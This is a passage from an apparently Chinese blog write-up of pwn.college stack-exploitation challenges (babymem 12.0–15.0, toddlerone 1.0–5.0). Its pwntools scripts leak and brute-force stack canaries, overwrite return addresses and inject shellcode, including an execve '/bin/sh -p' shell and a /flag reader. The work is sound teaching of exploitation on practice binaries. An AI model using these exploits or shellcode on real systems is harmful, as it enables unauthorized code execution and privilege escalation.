</span></span></code></pre></div><h3 id=120 class="relative group">12.0 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#120 aria-label=锚点>#</a></span></h3><p>题目提供了一个后门，使得只要输入中含有 <code>REPEAT</code>，<code>challenge()</code> 就会重新执行。利用这一点以及 canary 最低字节必定为 0 的特性，我们覆盖 canary 最低字节为 <code>0x01</code>，从而使得栈上字符串不被截断，顺带打印出 canary 高 7 字节的值。随后在溢出时只需要注意用正确的值覆盖 canary 即可绕开检测，剩余部分类似 7.0。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>win</span> <span class=o>=</span> <span class=mh>0x751</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>binary</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;REPEATaa&#39;</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x10</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x01</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x01</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>canary</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>r</span><span class=p>(</span><span class=mi>7</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>leak</span><span class=p>(</span><span class=s1>&#39;canary&#39;</span><span class=p>,</span> <span class=n>canary</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x18</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>canary</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span> <span class=o>+</span> <span class=n>p16</span><span class=p>(</span><span class=n>win</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvall</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;pwn.college{&#39;</span> <span class=ow>in</span> <span class=n>res</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>res</span><span class=p>[</span><span class=o>-</span><span class=mi>100</span><span class=p>:])</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span></code></pre></div><h3 id=130 class="relative group">13.0 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#130 aria-label=锚点>#</a></span></h3><p>类似 10.0。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>172</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=140 class="relative group">14.0 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#140 aria-label=锚点>#</a></span></h3><p>本题和 12.0 的区别在于打印函数只会打印 268 个字符，而输入到 canary 相距 272 字节。不过本题比较仁慈，canary 的值在栈上距离更近的位置也有出现，可以 leak 这些位置的值。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>win</span> <span class=o>=</span> <span class=mh>0x13c</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>binary</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;REPEATaa&#39;</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x01</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x01</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>canary</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>r</span><span class=p>(</span><span class=mi>7</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>leak</span><span class=p>(</span><span class=s1>&#39;canary&#39;</span><span class=p>,</span> <span class=n>canary</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>280</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>canary</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span> <span class=o>+</span> <span class=n>p16</span><span class=p>(</span><span class=n>win</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvall</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;pwn.college{&#39;</span> <span class=ow>in</span> <span class=n>res</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>res</span><span class=p>[</span><span class=o>-</span><span class=mi>100</span><span class=p>:])</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span></code></pre></div><h3 id=150 class="relative group">15.0 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#150 aria-label=锚点>#</a></span></h3><p>暴力枚举 canary 的每一位，因为服务器每次 <code>fork()</code> 不会重新随机产生 canary（注意保持服务器开启）。而在暴力猜 win 地址倒数第四位时则可以通过重启服务器来重试。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>win</span> <span class=o>=</span> <span class=mh>0x1d85</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>24</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>7</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>b</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x100</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;127.0.0.1&#34;</span><span class=p>,</span> <span class=mi>1337</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>guess</span> <span class=o>=</span> <span class=n>b</span><span class=o>.</span><span class=n>to_bytes</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s1>&#39;big&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>s</span><span class=p>(</span><span class=n>payload</span> <span class=o>+</span> <span class=n>guess</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Goodbye!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>res</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>timeout</span><span class=o>=</span><span class=mf>0.5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>res</span> <span class=o>==</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>leak</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;Byte </span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s1> of canary&#39;</span><span class=p>,</span> <span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>payload</span> <span class=o>+=</span> <span class=n>guess</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;127.0.0.1&#34;</span><span class=p>,</span> <span class=mi>1337</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span> <span class=o>+</span> <span class=n>p16</span><span class=p>(</span><span class=n>win</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><h2 id=toddlerone-exploitation-scenarios class="relative group">toddlerone: Exploitation Scenarios <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#toddlerone-exploitation-scenarios aria-label=锚点>#</a></span></h2><p>模版同 babymem。</p><h3 id=10-3 class="relative group">1.0 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#10-3 aria-label=锚点>#</a></span></h3><p>注入类似 babyshell 1 的 shellcode，然后 ret2shellcode。</p><p>ORW 方法：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># read(0, address of rip, 1000)</span>
</span></span><span class=line><span class=cl><span class=n>sc1</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>xor rax, rax
</span></span></span><span class=line><span class=cl><span class=s2>xor rdi, rdi
</span></span></span><span class=line><span class=cl><span class=s2>lea rsi, [rip]
</span></span></span><span class=line><span class=cl><span class=s2>mov rdx, 1000  # &lt;- rip
</span></span></span><span class=line><span class=cl><span class=s2>syscall        # sc2 comes after syscall
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># orw</span>
</span></span><span class=line><span class=cl><span class=n>sc2</span> <span class=o>=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>readfile</span><span class=p>(</span><span class=s2>&#34;/flag&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sc1_addr</span> <span class=o>=</span> <span class=mh>0x169e0000</span>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s1>&#39;stdin.&#39;</span><span class=p>,</span> <span class=n>asm</span><span class=p>(</span><span class=n>sc1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x38</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>sc1_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>nop</span><span class=o>*</span><span class=mi>16</span> <span class=o>+</span> <span class=n>asm</span><span class=p>(</span><span class=n>sc2</span><span class=p>))</span>
</span></span></code></pre></div><p>拿 shell 方法：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># execve(&#34;/bin/sh\x00&#34;,[&#34;/bin/sh\x00&#34;, &#34;-p\x00\x00&#34;],NULL)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov rax, 59                # execve
</span></span></span><span class=line><span class=cl><span class=s2>mov rbx, 0x68732f6e69622f  # &#34;/bin/sh&#34;
</span></span></span><span class=line><span class=cl><span class=s2>push rbx
</span></span></span><span class=line><span class=cl><span class=s2>mov rdi, rsp               # rdi -&gt; &#34;/bin/sh&#34; on stack
</span></span></span><span class=line><span class=cl><span class=s2>push 0x702d                # &#34;-p&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov rcx, rsp               # rcx -&gt; &#34;-p&#34; on stack
</span></span></span><span class=line><span class=cl><span class=s2>push 0
</span></span></span><span class=line><span class=cl><span class=s2>push rcx
</span></span></span><span class=line><span class=cl><span class=s2>push rdi
</span></span></span><span class=line><span class=cl><span class=s2>mov rsi, rsp               # rsi -&gt; [rdi, rcx, 0] on stack -&gt; [&#34;/bin/sh&#34;,&#34;-p&#34;,NULL]
</span></span></span><span class=line><span class=cl><span class=s2>mov rdx, 0                 # NULL
</span></span></span><span class=line><span class=cl><span class=s2>syscall
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>sc_addr</span> <span class=o>=</span> <span class=mh>0x169e0000</span>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s1>&#39;stdin.&#39;</span><span class=p>,</span> <span class=n>asm</span><span class=p>(</span><span class=n>sc</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x38</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>sc_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><p>为调试方便，后续题目使用 babymem 13 的 shellcode。</p><blockquote><p>注：toddlerone 后续所有题目的 <code>x.1</code> 均是在 <code>x.0</code> 基础上要求自己确定偏移量和地址，不再赘述。</p></blockquote><h3 id=20-4 class="relative group">2.0 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#20-4 aria-label=锚点>#</a></span></h3><p>往栈上写 shellcode，然后返回到栈上。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># chmod(&#34;a&#34;, 4)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov al, 0x5a  # chmod
</span></span></span><span class=line><span class=cl><span class=s2>push 0x61     # &#34;a&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov rdi, rsp  # rdi -&gt; &#34;a&#34; on stack
</span></span></span><span class=line><span class=cl><span class=s2>mov sil, 4    # 4 -&gt; 000 000 100
</span></span></span><span class=line><span class=cl><span class=s2>syscall
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>sc_addr</span> <span class=o>=</span> <span class=mh>0x7fffffffd290</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=n>sc</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x78</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>sc_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><p>2.1 的主要坑点在于，为了确定栈地址需要将环境变量清空：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>env</span><span class=o>=</span><span class=p>{})</span>
</span></span></code></pre></div><p>随后再 gdb 确定偏移量即可，最后编写 exp 时也要注意清空环境变量使栈地址固定：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>env</span><span class=o>=</span><span class=p>{})</span>
</span></span></code></pre></div><p>为了避免环境变量影响，接下来的题目中均使用这种方式启动进程。</p><blockquote><p>2.0 中如果清空环境变量，则 <code>sc_addr</code> 应设置为 <code>0x7fffffffdcb0</code>。</p></blockquote><h3 id=30-2 class="relative group">3.0 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#30-2 aria-label=锚点>#</a></span></h3><p>第一轮同时泄漏 canary 和 Saved RBP 地址，我们希望通过 Saved RBP 地址推导出栈上的输入地址。</p><p>观察可得：</p><ul><li><p>第一次 challenge 输入地址 - 第二次 challenge 输入地址 = 0xd0</p></li><li><p>Saved RBP 地址 - 输入地址 = 0x10c0</p></li></ul><p>由此可以算出：</p><p>第二次 challenge 输入地址 = 第一次 challenge 输入地址 - 0xd0 = （第一次 Saved RBP 地址 - 0x10c0）- 0xd0</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># chmod(&#34;a&#34;, 4)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov al, 0x5a  # chmod
</span></span></span><span class=line><span class=cl><span class=s2>push 0x61     # &#34;a&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov rdi, rsp  # rdi -&gt; &#34;a&#34; on stack
</span></span></span><span class=line><span class=cl><span class=s2>mov sil, 4    # 4 -&gt; 000 000 100
</span></span></span><span class=line><span class=cl><span class=s2>syscall
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;REPEATaa&#39;</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x70</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x01</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x01</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>canary</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>r</span><span class=p>(</span><span class=mi>7</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;canary&#39;</span><span class=p>,</span> <span class=n>canary</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>saved_rbp</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;saved rbp&#39;</span><span class=p>,</span> <span class=n>saved_rbp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>chall1_buf</span> <span class=o>=</span> <span class=p>(</span><span class=n>saved_rbp</span> <span class=o>-</span> <span class=mh>0x10c0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>chall2_buf</span> <span class=o>=</span> <span class=n>chall1_buf</span> <span class=o>-</span> <span class=mh>0xd0</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;sc addr&#39;</span><span class=p>,</span> <span class=n>chall2_buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=n>sc</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x78</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>canary</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>chall2_buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=40-2 class="relative group">4.0 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#40-2 aria-label=锚点>#</a></span></h3><p>在 3.0 基础上对 canary 前的一个值有要求。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># chmod(&#34;a&#34;, 4)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov al, 0x5a  # chmod
</span></span></span><span class=line><span class=cl><span class=s2>push 0x61     # &#34;a&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov rdi, rsp  # rdi -&gt; &#34;a&#34; on stack
</span></span></span><span class=line><span class=cl><span class=s2>mov sil, 4    # 4 -&gt; 000 000 100
</span></span></span><span class=line><span class=cl><span class=s2>syscall
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>val</span> <span class=o>=</span> <span class=mh>0x68EDE977CB04B929</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;REPEATaa&#39;</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x80</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x01</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x01</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>canary</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>r</span><span class=p>(</span><span class=mi>7</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;canary&#39;</span><span class=p>,</span> <span class=n>canary</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>saved_rbp</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;saved rbp&#39;</span><span class=p>,</span> <span class=n>saved_rbp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>chall1_buf</span> <span class=o>=</span> <span class=p>(</span><span class=n>saved_rbp</span> <span class=o>-</span> <span class=mh>0x10d0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;chall1 buf&#39;</span><span class=p>,</span> <span class=n>chall1_buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>chall2_buf</span> <span class=o>=</span> <span class=n>chall1_buf</span> <span class=o>-</span> <span class=mh>0xe0</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;sc addr&#39;</span><span class=p>,</span> <span class=n>chall2_buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=n>sc</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x80</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>val</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>canary</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>chall2_buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=50-2 class="relative group">5.0 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#50-2 aria-label=锚点>#</a></span></h3><p>在 4.0 的基础上隔开了 canary 和 Saved RBP，可以用 REPEAT 两轮分两次泄漏。还有一个 seccomp 沙箱，但是可以通过程序中的后门逃逸，只要让栈上的一个值为特定值即可。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># chmod(&#34;a&#34;, 4)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov al, 0x5a  # chmod
</span></span></span><span class=line><span class=cl><span class=s2>push 0x61     # &#34;a&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov rdi, rsp  # rdi -&gt; &#34;a&#34; on stack
</span></span></span><span class=line><span class=cl><span class=s2>mov sil, 4    # 4 -&gt; 000 000 100
</span></span></span><span class=line><span class=cl><span class=s2>syscall
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>val</span> <span class=o>=</span> <span class=mh>0x848FFD3CEC0476D2</span>
